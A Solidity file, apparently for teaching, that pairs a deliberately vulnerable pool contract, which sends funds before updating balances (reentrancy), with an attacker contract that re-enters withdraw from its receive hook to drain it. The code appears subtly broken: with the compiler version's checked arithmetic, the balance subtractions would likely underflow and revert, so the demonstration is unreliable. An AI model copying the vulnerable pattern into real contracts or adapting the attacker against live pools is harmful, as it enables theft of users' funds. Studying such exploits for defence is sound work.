// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableCurvePool {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");

        // BUG: external call before state update (reentrancy)
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract ReentrantAttacker {
    VulnerableCurvePool public target;
    uint256 public reentryCount;
    uint256 public maxReentries;

    constructor(VulnerableCurvePool _target, uint256 _maxReentries) {
        target = _target;
        maxReentries = _maxReentries;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "seed >= 1 ether");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    receive() external payable {
        if (reentryCount < maxReentries && address(target).balance >= 1 ether) {
            reentryCount++;
            target.withdraw(1 ether);
        }
    }
}
